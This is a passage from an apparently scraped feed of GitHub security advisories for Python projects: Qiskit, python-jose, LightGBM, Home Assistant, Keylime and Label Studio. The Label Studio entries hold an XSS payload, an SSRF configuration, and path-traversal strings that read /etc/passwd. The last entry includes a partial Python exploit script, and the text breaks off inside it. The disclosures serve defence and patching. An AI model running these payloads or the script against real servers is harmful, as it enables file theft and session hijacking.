<p>[1] <a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1403">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>
<li><a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>
<li><a href="https://www.ibm.com/support/pages/node/7183868">https://www.ibm.com/support/pages/node/7183868</a></li>
<li><a href="https://github.com/advisories/GHSA-fpmr-m242-xm7x">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpmr-m242-xm7x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-21T21:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit]]></title>
        <id>https://github.com/advisories/GHSA-fpmr-m242-xm7x</id>
        <link href="https://github.com/advisories/GHSA-fpmr-m242-xm7x"/>
        <updated>2025-02-21T21:42:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>
<h3 id="patches">Patches</h3>
<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>
<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>
<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>
<pre><code class="language-python">import struct
from collections import namedtuple


def check_qpy_payload(path: str) -&gt; bool:
    """Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.

    Args:
        path: The path to the QPY file

    Returns:
        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for
        being vulnerable exist, however the payload may not be vulnerable it can't be detected
        until trying to deserialize.
    """
    with open(path, "rb") as file_obj:
        version = struct.unpack("!6sB", file_obj.read(7))[1]
        if version &lt; 10 or version &gt;= 13:
            return False
        file_obj.seek(0)
        header_tuple = namedtuple(
            "FILE_HEADER",
            [
                "preface",
                "qpy_version",
                "major_version",
                "minor_version",
                "patch_version",
                "num_programs",
                "symbolic_encoding",
            ],
        )
        header_pack_str = "!6sBBBBQc"
        header_read_size = struct.calcsize(header_pack_str)
        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))
        header = header_tuple(*data)
        return header.symbolic_encoding == b"e"
</code></pre>
<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>
<h3 id="references">References</h3>
<p>[1] <a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1403">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>
<li><a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>
<li><a href="https://www.ibm.com/support/pages/node/7183868">https://www.ibm.com/support/pages/node/7183868</a></li>
<li><a href="https://github.com/advisories/GHSA-fpmr-m242-xm7x">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpmr-m242-xm7x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-21T21:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-jose] python-jose algorithm confusion with OpenSSH ECDSA keys]]></title>
        <id>https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</id>
        <link href="https://github.com/advisories/GHSA-6c5p-j8vq-pqhj"/>
        <updated>2025-02-18T22:48:16.000Z</updated>
        <content type="html"><![CDATA[<p>python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats. This is similar to CVE-2022-29217.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-33663">https://nvd.nist.gov/vuln/detail/CVE-2024-33663</a></li>
<li><a href="https://github.com/mpdavis/python-jose/issues/346">https://github.com/mpdavis/python-jose/issues/346</a></li>
<li><a href="https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663">https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6c5p-j8vq-pqhj">https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-26T00:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-jose] python-jose denial of service via compressed JWE content]]></title>
        <id>https://github.com/advisories/GHSA-cjwg-qfpm-7377</id>
        <link href="https://github.com/advisories/GHSA-cjwg-qfpm-7377"/>
        <updated>2025-02-18T22:46:49.000Z</updated>
        <content type="html"><![CDATA[<p>python-jose through 3.3.0 allows attackers to cause a denial of service (resource consumption) during a decode via a crafted JSON Web Encryption (JWE) token with a high compression ratio, aka a "JWT bomb." This is similar to CVE-2024-21319.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-33664">https://nvd.nist.gov/vuln/detail/CVE-2024-33664</a></li>
<li><a href="https://github.com/mpdavis/python-jose/issues/344">https://github.com/mpdavis/python-jose/issues/344</a></li>
<li><a href="https://github.com/mpdavis/python-jose/pull/345">https://github.com/mpdavis/python-jose/pull/345</a></li>
<li><a href="https://www.vicarius.io/vsociety/posts/jwt-bomb-in-python-jose-cve-2024-33664">https://www.vicarius.io/vsociety/posts/jwt-bomb-in-python-jose-cve-2024-33664</a></li>
<li><a href="https://github.com/mpdavis/python-jose/releases/tag/3.4.0">https://github.com/mpdavis/python-jose/releases/tag/3.4.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-233.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-233.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-cjwg-qfpm-7377">https://github.com/advisories/GHSA-cjwg-qfpm-7377</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cjwg-qfpm-7377</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-26T00:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lightgbm] LightGBM Remote Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2586-f3p4-hq84</id>
        <link href="https://github.com/advisories/GHSA-2586-f3p4-hq84"/>
        <updated>2025-02-18T19:25:53.000Z</updated>
        <content type="html"><![CDATA[<p>LightGBM Remote Code Execution Vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43598">https://nvd.nist.gov/vuln/detail/CVE-2024-43598</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43598">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43598</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/lightgbm/PYSEC-2024-231.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/lightgbm/PYSEC-2024-231.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2586-f3p4-hq84">https://github.com/advisories/GHSA-2586-f3p4-hq84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2586-f3p4-hq84</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-12T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[homeassistant] Home Assistant does not correctly validate SSL for outgoing requests in core and used libs]]></title>
        <id>https://github.com/advisories/GHSA-m3pm-rpgg-5wj6</id>
        <link href="https://github.com/advisories/GHSA-m3pm-rpgg-5wj6"/>
        <updated>2025-02-18T22:51:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Problem: Potential man-in-the-middle attacks due to missing SSL certificate verification in the project codebase and used third-party libraries.</p>
<h2 id="details">Details</h2>
<p>In the past, <code>aiohttp-session</code>/<code>request</code> had the parameter <code>verify_ssl</code> to control SSL certificate verification. This was a boolean value. In <code>aiohttp</code> 3.0, this parameter was deprecated in favor of the <code>ssl</code> parameter. Only when <code>ssl</code> is set to <code>None</code> or provided with a correct configured SSL context the standard SSL certificate verification will happen.</p>
<p>When migrating integrations in Home Assistant and libraries used by Home Assistant, in some cases the <code>verify_ssl</code> parameter value was just moved to the new <code>ssl</code> parameter. This resulted in these integrations and 3rd party libraries using <code>request.ssl = True</code>, which unintentionally turned off SSL certificate verification and opened up a man-in-the-middle attack vector.</p>
<p>Example:
<a href="https://github.com/home-assistant/core/blob/c4411914c2e906105b765c00af5740bd0880e946/homeassistant/components/discord/notify.py#L84">https://github.com/home-assistant/core/blob/c4411914c2e906105b765c00af5740bd0880e946/homeassistant/components/discord/notify.py#L84</a></p>
<p>When you scan the libraries used by the integrations in Home Assistant, you will find more issues like this.</p>
<p>The general handling in Home Assistant looks good, as <code>homeassistant.helpers.aoihttp_client._async_get_connector</code> handles it correctly.</p>
<h2 id="poc">PoC</h2>
<ol>
<li>Check that expired.badssl.com:443 gives an SSL error in when connecting with curl or browser.</li>
<li>Add the integration adguard with the setting <code>host=expired.badssl.com</code>, <code>port=443</code>, <code>use-ssl=true</code>, <code>verify-ssl=true</code>.</li>
<li>Check the logs - you get a HTTP 403 response.</li>
</ol>
<p>Expected behavior:</p>
<ol>
<li>The integration log shows an <code>ssl.SSLCertVerificationError</code>.</li>
</ol>
<p>The following code shows the problem with <code>ssl=True</code>. No exception is raised when <code>ssl=True</code> (Python 3.11.6).</p>
<pre><code>import asyncio
from ssl import SSLCertVerificationError

import aiohttp

BAD_URL = "https://expired.badssl.com/"


async def run_request(verify_ssl, result_placeholder: str):
    async with aiohttp.ClientSession() as session:
        exception_fired: bool = False
        try:
            await session.request("OPTIONS", BAD_URL, ssl=verify_ssl)
        except SSLCertVerificationError:
            exception_fired = True
        except Exception as error:
            print(error)
        else:
            exception_fired = False
        print(result_placeholder.format(exception_result=exception_fired))


# Case 1: ssl=False --&gt; expected result: No exception
asyncio.run(run_request(False, "Test case 1: expected result: False - result: {exception_result}"))

# Case 2: ssl=None --&gt; expected result: Exception
asyncio.run(run_request(None, "Test case 2: expected result: True - result: {exception_result}"))

# Case 3: ssl=True --&gt; expected result: No Exception
asyncio.run(run_request(True, "Test case 3: expected result: False - result: {exception_result}"))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/home-assistant/core/security/advisories/GHSA-m3pm-rpgg-5wj6">https://github.com/home-assistant/core/security/advisories/GHSA-m3pm-rpgg-5wj6</a></li>
<li><a href="https://github.com/home-assistant/core/commit/8c6547f1b64f4a3d9f10090b97383353c9367892">https://github.com/home-assistant/core/commit/8c6547f1b64f4a3d9f10090b97383353c9367892</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25305">https://nvd.nist.gov/vuln/detail/CVE-2025-25305</a></li>
<li><a href="https://github.com/advisories/GHSA-m3pm-rpgg-5wj6">https://github.com/advisories/GHSA-m3pm-rpgg-5wj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m3pm-rpgg-5wj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-18T19:25:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keylime] Keylime registrar is vulnerable to Denial-of-Service attack when updated to version 7.12.0]]></title>
        <id>https://github.com/advisories/GHSA-9jxq-5x44-gx23</id>
        <link href="https://github.com/advisories/GHSA-9jxq-5x44-gx23"/>
        <updated>2025-02-14T18:03:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Keylime <code>registrar</code> implemented more strict type checking on version 7.12.0. As a result, when updated to version 7.12.0, the <code>registrar</code> will not accept the format of the data previously stored in the database by versions  &gt;= 7.8.0, raising an exception.</p>
<p>This makes the Keylime <code>registrar</code> vulnerable to a Denial-of-Service attack in an update scenario, as an attacker could populate the <code>registrar</code> database by creating multiple valid agent registrations with different UUIDs while the version is still &lt; 7.12.0. Then, when the Keylime <code>registrar</code> is updated to the 7.12.0 version, any query to the database matching any of the entries populated by the attacker will result in failure.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade to versions &gt;= 7.12.1</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Remove the registrar database and re-register all agents</li>
</ul>
<h3 id="credit">Credit</h3>
<p>Reported by: Anderson Toshiyuki Sasaki/@ansasaki
Patched by: Anderson Toshiyuki Sasaki/@ansasaki</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23">https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23</a></li>
<li><a href="https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7">https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7</a></li>
<li><a href="https://github.com/advisories/GHSA-9jxq-5x44-gx23">https://github.com/advisories/GHSA-9jxq-5x44-gx23</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jxq-5x44-gx23</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-14T18:03:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio allows Server-Side Request Forgery in the S3 Storage Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-m238-fmcw-wh58</id>
        <link href="https://github.com/advisories/GHSA-m238-fmcw-wh58"/>
        <updated>2025-02-14T22:18:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Label Studio's S3 storage integration feature contains a Server-Side Request Forgery (SSRF) vulnerability in its endpoint configuration. When creating an S3 storage connection, the application allows users to specify a custom S3 endpoint URL via the s3_endpoint parameter. This endpoint URL is passed directly to the boto3 AWS SDK without proper validation or restrictions on the protocol or destination.</p>
<p>The vulnerability allows an attacker to make the application send HTTP requests to arbitrary internal services by specifying them as the S3 endpoint. When the storage sync operation is triggered, the application attempts to make S3 API calls to the specified endpoint, effectively making HTTP requests to the target service and returning the response in error messages.</p>
<p>This SSRF vulnerability enables attackers to bypass network segmentation and access internal services that should not be accessible from the external network. The vulnerability is particularly severe because error messages from failed requests contain the full response body, allowing data exfiltration from internal services.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ol>
<li><p>Create an account in Label Studio</p>
</li>
<li><p>Create a new project with basic configuration</p>
</li>
<li><p>Create an S3 storage connection with the following configuration:</p>
<pre><code class="language-json">{
  "project": 1,
  "title": "Test Storage",
  "bucket": "&lt;filename&gt;",
  "s3_endpoint": "http://internal-web",
  "use_blob_urls": true,
  "aws_access_key_id": "test",
  "aws_secret_access_key": "test"
}
</code></pre>
</li>
<li><p>Trigger a storage sync operation by sending a POST request to <code>/api/storages/s3/[storage_id]/sync</code></p>
</li>
</ol>
<p>The application will attempt to connect to the specified endpoint URL as if it were an S3 service. When the request fails due to invalid S3 API responses, the error message will contain the raw response from the internal service, allowing access to internal resources.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Implement strict validation of S3 endpoint URLs to allow only valid S3service endpoints</li>
<li>Add an allowlist of endpoint domains and protocols</li>
<li>Sanitize error messages to prevent leakage of sensitive information from failed requests</li>
<li>Consider implementing network-level controls to restrict outbound connections from the application server</li>
</ul>
<h2 id="impact">Impact</h2>
<p>This vulnerability has high severity as it allows authenticated users to make requests to arbitrary internal services from the application server, potentially exposing sensitive internal resources and bypassing network segmentation. The inclusion of response data in error messages makes this particularly effective for data exfiltration.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79">https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25297">https://nvd.nist.gov/vuln/detail/CVE-2025-25297</a></li>
<li><a href="https://github.com/advisories/GHSA-m238-fmcw-wh58">https://github.com/advisories/GHSA-m238-fmcw-wh58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m238-fmcw-wh58</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-14T15:26:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio allows Cross-Site Scripting (XSS) via GET request to `/projects/upload-example` endpoint]]></title>
        <id>https://github.com/advisories/GHSA-wpq5-3366-mqw4</id>
        <link href="https://github.com/advisories/GHSA-wpq5-3366-mqw4"/>
        <updated>2025-02-14T22:18:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Label Studio's <code>/projects/upload-example</code> endpoint allows injection of arbitrary HTML through a <code>GET</code> request with an appropriately crafted <code>label_config</code> query parameter. By crafting a specially formatted XML label config with inline task data containing malicious HTML/JavaScript, an attacker can achieve Cross-Site Scripting (XSS). While the application has a Content Security Policy (CSP), it is only set in report-only mode, making it ineffective at preventing script execution.</p>
<p>The vulnerability exists because the upload-example endpoint renders user-provided HTML content without proper sanitization on a GET request. This allows attackers to inject and execute arbitrary JavaScript in victims' browsers by getting them to visit a maliciously crafted URL.</p>
<p>This is considered vulnerable because it enables attackers to execute JavaScript in victims' contexts, potentially allowing theft of sensitive data, session hijacking, or other malicious actions.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ol>
<li>Create a malicious label config that includes an XSS payload in embedded task data:</li>
</ol>
<pre><code class="language-xml">&lt;View&gt;&lt;!-- {"data": {"text": "&lt;div&gt;&lt;img src=x
onerror=eval(atob(`YWxlcnQoIlhTUyIp`))&gt;&lt;/div&gt;"}} --&gt;&lt;HyperText name="text"
value="$text"/&gt;&lt;/View&gt;
</code></pre>
<ol start="2">
<li>URL encode the payload and access the following URL:</li>
</ol>
<ul>
<li><a href="http://app/projects/upload-example/?label_config=%3CView%3E%3C!--%20%7B%22data%22:%20%7B%22text%22:%20%22%3Cdiv%3E%3Cimg%20src=x%20onerror=eval(atob(%60YWxlcnQoIlhTUyIp%60))%3E%3C/div%3E%22%7D%7D%20--%3E%3CHyperText%20name=%22text%22%20value=%22$text%22/%3E%3C/View%3E">http://app/projects/upload-example/?label_config=%3CView%3E%3C!--%20{%22data%22:%20{%22text%22:%20%22%3Cdiv%3E%3Cimg%20src=x%20onerror=eval(atob(`YWxlcnQoIlhTUyIp`))%3E%3C/div%3E%22}}%20--%3E%3CHyperText%20name=%22text%22%20value=%22$text%22/%3E%3C/View%3E</a></li>
</ul>
<p>When executed, the payload causes the application to render an HTML page containing an img tag that fails to load, triggering the onerror event handler which executes base64-decoded JavaScript, demonstrating successful XSS execution in the victim's browser.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Enable the Content Security Policy in enforcement mode instead of report-only mode to actively block unauthorized script execution</li>
<li>Deprecate the <code>GET</code> behavior at the <code>example-config</code> endpoint since it's not used</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The vulnerability requires no special privileges and can be exploited by getting a victim to visit a crafted URL. The impact is high as it allows arbitrary JavaScript execution in victims' browsers, potentially exposing sensitive data or enabling account takeover through session theft.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-wpq5-3366-mqw4">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-wpq5-3366-mqw4</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/8cf6958e1e27ef6a03ed287e674470975d340885">https://github.com/HumanSignal/label-studio/commit/8cf6958e1e27ef6a03ed287e674470975d340885</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25296">https://nvd.nist.gov/vuln/detail/CVE-2025-25296</a></li>
<li><a href="https://github.com/advisories/GHSA-wpq5-3366-mqw4">https://github.com/advisories/GHSA-wpq5-3366-mqw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpq5-3366-mqw4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-14T15:23:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio-sdk] Label Studio has a Path Traversal Vulnerability via image Field]]></title>
        <id>https://github.com/advisories/GHSA-rgv9-w7jp-m23g</id>
        <link href="https://github.com/advisories/GHSA-rgv9-w7jp-m23g"/>
        <updated>2025-02-14T18:40:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>A path traversal vulnerability in Label Studio SDK versions prior to 1.0.10 allows unauthorized file access outside the intended directory structure. Label Studio versions before 1.16.0 specified SDK versions prior to 1.0.10 as dependencies, and the issue was confirmed in Label Studio version 1.13.2.dev0; therefore, Label Studio users should upgrade to 1.16.0 or newer to mitigate it. The flaw exists in the VOC, COCO and YOLO export functionalites. These functions invoke a <code>download</code> function on the <code>label-studio-sdk</code> python package, which fails to validate file paths when processing image references during task exports:</p>
<pre><code class="language-python">def download(
    url,
    output_dir,
    filename=None,
    project_dir=None,
    return_relative_path=False,
    upload_dir=None,
    download_resources=True,
):
    is_local_file = url.startswith("/data/") and "?d=" in url
    is_uploaded_file = url.startswith("/data/upload")

    if is_uploaded_file:
        upload_dir = _get_upload_dir(project_dir, upload_dir)
        filename = urllib.parse.unquote(url.replace("/data/upload/", ""))
        filepath = os.path.join(upload_dir, filename)
        logger.debug(
            f"Copy {filepath} to {output_dir}".format(
                filepath=filepath, output_dir=output_dir
            )
        )
        if download_resources:
            shutil.copy(filepath, output_dir)
        if return_relative_path:
            return os.path.join(
                os.path.basename(output_dir), os.path.basename(filename)
            )
        return filepath

    if is_local_file:
        filename, dir_path = url.split("/data/", 1)[-1].split("?d=")
        dir_path = str(urllib.parse.unquote(dir_path))
        filepath = os.path.join(LOCAL_FILES_DOCUMENT_ROOT, dir_path)
        if not os.path.exists(filepath):
            raise FileNotFoundError(filepath)
        if download_resources:
            shutil.copy(filepath, output_dir)
        return filepath
</code></pre>
<p>By creating tasks with path traversal sequences in the image field, an attacker can force the application to read files from arbitrary server filesystem locations when exporting projects in any of the mentioned formats.</p>
<p>Note that there are two different possible code paths leading to this result, one for the <code>is_uploaded_file</code> and another one for the <code>is_local_file</code>.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Login to Label Studio</p>
</li>
<li><p>Create project with image labeling configuration</p>
</li>
<li><p>If the <code>data/media/upload</code> directory doesn't exists yet, upload an image to force the server to create it</p>
</li>
<li><p>Create task with path traversal in image field</p>
<p> 4.1. To trigger the <code>is_uploaded_file</code> code path:</p>
<pre><code class="language-json">{
  "data": {
    "text": "test",
    "image": "/data/upload/../../../../../etc/passwd"
  }
}
</code></pre>
<p> 4.2. To trigger the <code>is_local_file</code> code path:</p>
<pre><code class="language-json">{
  "data": {
    "text": "test",
    "image": "/data/local-files/?d=../../../etc/passwd"
  }
}
</code></pre>
</li>
<li><p>Export project using VOC, YOLO or COCO formats. The server will return a Zip file in any of the three cases, for example:</p>
<pre><code>GET /api/projects/1/export?exportType=VOC&amp;download_all_tasks=true&amp;download_resources=true
</code></pre>
</li>
<li><p>Download the generated Zip file. The server's /etc/passwd file will be at <code>images/passwd</code> on the Zip file.</p>
</li>
</ol>
<p>Alternatively, use the following exploit code, updating the <code>BASE_URL</code>, <code>USERNAME</code> and <code>PASSWORD</code> variables. Please note that the code will attempt to create a new user, but if the user exists and the credentials are valid, it will still work. Modify <code>METHOD</code> and <code>EXPORT_TYPE</code> to test the different code paths and export formats:</p>
<pre><code class="language-python">import requests
from bs4 import BeautifulSoup
import io
import zipfile


BASE_URL = "http://xbow-app-1:8000"
USERNAME = "test@test.com"
PASSWORD = "Test123!@#"
METHOD = "is_uploaded_file" # Valid values: "is_uploaded_file" or "is_local_file"
EXPORT_TYPE = "VOC"         # Valid values: "VOC", "COCO" or "YOLO"

print("Signing up...")
url = "%s/user/signup/" % BASE_URL
session = requests.Session()

# First get the CSRF token
response = session.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
print(f"Got CSRF token: {csrf_token}")

# Prepare registration data
data = {
    'csrfmiddlewaretoken': csrf_token,
    'email': USERNAME,
    'password': PASSWORD,
    'allow_newsletters': 'false',
    'allow_newsletters_visual': 'false'
}

headers = {
    'Referer': url,
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Submit the registration request
response = session.post(url, data=data, headers=headers)
print(f"User registration response status code: {response.status_code}\n")

# Login
print("Logging in...")
url = "%s/user/login" % BASE_URL

# Attempt login with our credentials
login_data = {
    'csrfmiddlewaretoken': csrf_token,
    'email': USERNAME,
    'password': PASSWORD,
}

headers = {
    'Referer': url,
    'Content-Type': 'application/x-www-form-urlencoded',
}

response = session.post(url, data=login_data, headers=headers)

print(f"Login response status code: {response.status_code}")

# Check if we got any tokens in the response
print("\nCookies after login:")
for cookie in session.cookies:
    print(f"{cookie.name}: {cookie.value}")


# We will use these headers moving forward
headers = {
    'Content-Type': 'application/json',
    'X-CSRFToken': session.cookies['csrftoken']
}

# Creat a project to then create a task associated to it
print("\nCreating project...")
# Try to create a project with a file upload configuration
project_data = {
    "title": "File Upload Test",
    "description": "Testing file upload functionality",
    "label_config": """
    &lt;View&gt;
      &lt;Image name="image" value="$image"/&gt;
      &lt;Text name="text" value="$text"/&gt;
      &lt;Choices name="choice" toName="image"&gt;
        &lt;Choice value="yes"/&gt;
        &lt;Choice value="no"/&gt;
      &lt;/Choices&gt;
    &lt;/View&gt;
    """
}
response = session.post("%s/api/projects/" % BASE_URL, json=project_data, headers=headers)
if response.status_code != 201:
    print("Problem creating project, aborting")
    exit(0)    
project_id = response.json()['id']
print(f"Project ID: {project_id}\n")

# Create task using a filename to later abuse a path traversal vulnerability during file export
print(f"Creating task with method {METHOD} (defaults to is_local_file)...")
task_data = {}
if (METHOD == "is_uploaded_file"):
    task_data["data"] = {
            "text": "test",
            "image": "/data/upload/../../../../../etc/passwd"    # Trigger for is_uploaded_file
    }
else:
    task_data["data"] = {
            "text": "test",
            "image": "/data/local-files/?d=../../../etc/passwd" # Trigger for is_local_file
    }
response = session.post(f"{BASE_URL}/api/projects/{project_id}/tasks", json=task_data, headers=headers)
if response.status_code != 201:
    print("Problem creating task, aborting")
    exit(0)    
